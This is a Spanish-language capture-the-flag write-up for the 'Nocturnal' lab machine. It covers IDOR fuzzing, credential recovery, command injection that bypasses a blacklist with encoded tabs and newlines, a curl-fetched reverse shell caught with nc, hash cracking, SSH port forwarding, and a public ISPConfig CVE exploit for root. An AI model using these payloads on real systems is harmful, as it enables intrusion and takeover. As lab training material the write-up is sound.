# Write-UP - Nocturnal 
- ---------
- Tags: #Linux #Easy 
- Skills Required: #Basic-Web-Enumeration #Basic-Knowledge-of-source-code-review #Basic-Database-Enumeration 
- Skills Learned: #Enumerating-and-exploiting-IDOR-vulnerabilities #Source-code-review-in-PHP-applications #Exploiting-Command-Injections-Vulnerabilities #Enumerating-SQLite-databases
-  - - -- - 
# Descripción:
Nocturnal es una máquina Linux de dificultad media que presenta una vulnerabilidad IDOR en una aplicación web PHP, lo que permite el acceso a los archivos subidos por otros usuarios. Se recuperan las credenciales para iniciar sesión en el panel de administración, donde se accede al código fuente de la aplicación. Se identifica una vulnerabilidad de inyección de comandos que proporciona una shell inversa como el usuario www-data. Se extraen hashes de contraseñas de una base de datos SQLite y se descifran para obtener acceso SSH como el usuario tobias. La explotación de CVE-2023-46818 en la aplicación ISPConfig permite la ejecución remota de comandos, lo que conlleva una escalada de privilegios al usuario root.
- - -- -
# Enumeración:
------
Comenzamos realizando un escaneo con Nmap en busca de puertos abiertos.
`nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn <IP>`
El resultado del escaneo nos revela que hay dos puertos abiertos en la máquina víctima, el 22 y el 80:
- En el puerto 22 corre OpenSSH.
- En el puerto 80 corre un servicio web (Nginx 1.18.0) a través del protocolo HTTP.
Para poder ver la web debemos añadirla al archivo `/etc/hosts`.

Al entrar en la web vemos que se nos da la opción de registrarnos e iniciar sesión, lo hacemos, una vez logueados observamos un campo que nos permite hacer una subida de archivos.
Al probar a subir un archivo .php nos aparece un mensaje "Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.", en este nos indican los tipos permitidos.
Si intentamos subir un archivo .pdf vemos que se sube sin ningún problema, al hacer hovering vemos que se nos redirige al siguiente enlace, `http://nocturnal.htb/view.php?username=user&file=test.pdf`, gracias a esto tenemos un forma potencial de enumerar usuarios, ya que si el usuario introducido no existe se nos devuelve el siguiente mensaje "User not found".

Ahora vamos a enumerar los usuarios existentes mediante un ataque de fuzzing al parámetro "username".
`ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf' -w /usr/share/Sec-Lists/Usernames/Names/names.txt -H 'Cookie: PHPSESSID=<YOUR-COOKIE>' -fs 2985`
Al finalizar el ataque de fuzzing vemos que hay un usuario llamado "amanda", por lo que si visitamos el siguiente enlace `http://nocturnal.htb/view.php?username=amanda&file=test.pdf`, se nos muestra que el usuario "amanda" tiene un archivo llamado "privacy.odt".

Nos descargamos el archivo "privacy.odt" y lo abrimos con `odt2txt privacy.odt`, dentro del contenido del archivo encontramos la credencial "arHkG7HAI68X8s1J" para el usuario "amanda". Con esto nos podemos loguear como "amanda" en el servicio web.
- - - -
# Explotación:
- - - - -
Al loguearnos vemos que "amanda" tiene acceso al Panel de Administración, en este se nos permite crear Backups de la app al proporcionar una contraseña.
Al realizar el backup vemos que es similar a la creación de un archivo .zip, por lo que la contraseña será la que permita acceder, como tenemos control sobre el campo de introducción de la contraseña, podríamos intentar inyectar comandos ayudándonos de ";".
Probamos a introducir `password; id`, lo que nos devuelve un error, por lo cual el campo de la contraseña podría estar siendo filtrado.

Otra cosa que se nos permite en el Panel de Administración es ver archivos de código, al ver el archivo "admin.php" vemos que estábamos en lo cierto, el campo está filtrado.
Observamos que hay una blacklists en lugar de filtrar los caracteres uno por uno. Además el carácter "space" está también bloqueado. Por otro lado vemos que los tabs y los saltos de línea no lo están.
Para que los tabs y los saltos de línea sean interpretados deben estar URL-encodeados:
- Tabs -> \t -> %09
- Salto de línea -> \n -> %0a
Usando estos caracteres, un payload nos puede permitir entablarnos una shell. Para llevar a cabo esto debemos de cumplir con dos fases:
- Fase 1 -> Descargarnos el payload con la shell a la máquina víctima utilizando `curl`.
- Fase 2 -> Ejecutar el payload con la shell que nos hemos descargado con `bash`.

El payload con la shell lo creamos así:
`echo "bash -c 'bash -i >& /dev/tcp/<YOUR-IP>/<PORT> 0>&1'" > shell`
A continuación nos levantamos un servidor HTTP en el puerto 80 con Python, `python3 -m http.server 80`.
Ahora debemos interceptar (con BurpSuite) la petición de crear un backup e introducimos lo siguiente, `password=test%0acurl%09http://<YOUR-IP>/shell%09-o%09/tmp/shell&backup=`, una vez enviada la petición nos debería de llegar una conexión a nuestro servidor HTTP mediante el método GET para el archivo /shell.

La fase 1 estaría completada, ahora pasaremos a la fase 2, en primer lugar debemos interceptar la petición de nuevo, pero en este caso introduciremos lo siguiente, `password=test%0abash%09/tmp/shell&backup=`, antes de enviar la petición nos ponemos a la escucha por el puerto que especificamos anteriormente, `nc -nlvp <PORT>`, ahora mandamos la petición.

Recibimos una shell como el usuario "www-data" en nuestra máquina atacante.
- -- - -
# Movimiento Lateral:
----
Después de realizar el tratamiento de la TTY, enumeramos el directorio web application.
Es dentro de application's web root donde encontramos un archivo llamado "nocturnal_database.db", abrimos la base de datos, `sqlite3 nocturnal_database.db`, listamos las tablas `.tables` y vemos una tabla llamada users, la cuál vamos a enumerar, `select * from users;`, aquí vemos la contraseña en hash para el usuario "tobias".
A continuación vamos a crackear el hash con hashcat, `hashcat -m 0 hash /usr/share/wordlists/rockyou.txt`, la contraseña en texto claro es "slowmotionapocalypse", usando esta contraseña nos podemos conectar a la máquina víctima como "tobias" a través de SSH y obtener la flag de usuario.
- - - -
# Elevación de Privilegios:
-----
Seguimos con la enumeración, ahora como el usuario "tobias", al hacer uso de `ss -tlnp` vemos que el puerto 8080 está abierto para la interfaz local.
Vamos a hacer port-forwarding de el puerto 8080 de la máquina víctima a la máquina atacante para investigar más, `ssh -L 8080:127.0.0.1:8080 -N -vv tobias@nocturnal.htb`.
Ahora podemos visitar `http://127.0.0.1:8080` desde nuestra máquina atacante.

Se puede observar como se encuentra corriendo ISPConfig, esto es un panel de control de alojamiento de código abierto para Linux. Podemos loguearnos como usuario "admin" y la contraseña que crackeamos para el usuario "tobias".
Una vez dentro vamos a la pestaña "help", donde se nos muestra la versión de ISPConfig, la cual es la 3.2.10p1.

Con esto podemos realizar una búsqueda en Google para encontrar vulnerabilidades para esta versión. Rápidamente encontramos el `CVE-2023-46818` que nos permite ejecución remota de código.
Encontramos una Proof-Of-Concept (PoC) en GitHub, la cual podemos usar para explotar esta vulnerabilidad.

Primero nos clonamos el repositorio, `git clone https://github.com/bipbopbup/CVE-2023-46818-python-exploit.git`, una vez dentro del repositorio clonado, podemos ejecutar el archivo "exploit.py" pasándole la contraseña para el usuario "admin", este nos otorga una shell interactiva como "root".
`python3 exploit.py http://127.0.0.1:8080 admin slowmotionapocalypse`
Al recibir la shell hacemos uso del comando `id` y vemos que somos root, por lo que finalmente podemos obtener la flag de root.